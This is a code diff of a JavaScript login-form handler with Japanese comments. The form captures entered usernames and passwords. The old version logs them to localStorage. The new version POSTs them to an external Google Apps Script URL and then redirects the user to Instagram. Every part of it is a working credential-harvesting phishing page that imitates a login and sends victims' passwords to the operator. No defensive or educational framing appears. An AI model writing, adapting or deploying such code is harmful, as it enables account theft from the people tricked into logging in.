@@ -1,16 +1,22 @@
 document.getElementById("login-form").addEventListener("submit", function(e) {
-    e.preventDefault();
+  e.preventDefault();
+  const name = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-
-    // ログを保存
-    let logs = JSON.parse(localStorage.getItem("loginLogs")) || [];
-    logs.push({username: username, password: password, time: new Date().toLocaleString()});
-    localStorage.setItem("loginLogs", JSON.stringify(logs));
-
-    // ✅ どんな入力でも成功としてリダイレクト
-    window.location.href = "https://www.instagram.com/";  // ←ここを好きなURLに変えてOK！
-
-    this.reset(); // 入力フォームをリセット
+  fetch("<<https://script.google.com/macros/s/AKfycbyH-_njO_Vc4rQpp0lOiD3GL-q2h8-3r7mlCD0lj2b9dfZskiVO1rE6R8N9Phixa5Ug/exec>>", {
+    method: "POST",
+    body: JSON.stringify({
+      name: name,
+      password: password
+    }),
+    headers: {
+      "Content-Type": "application/json"
+    }
+  }).then(res => {
+    if (res.ok) {
+      window.location.href = "Instagram.com"; // 成功後に飛ぶページ（任意）
+    } else {
+      alert("送信エラー");
+    }
+  });
 });
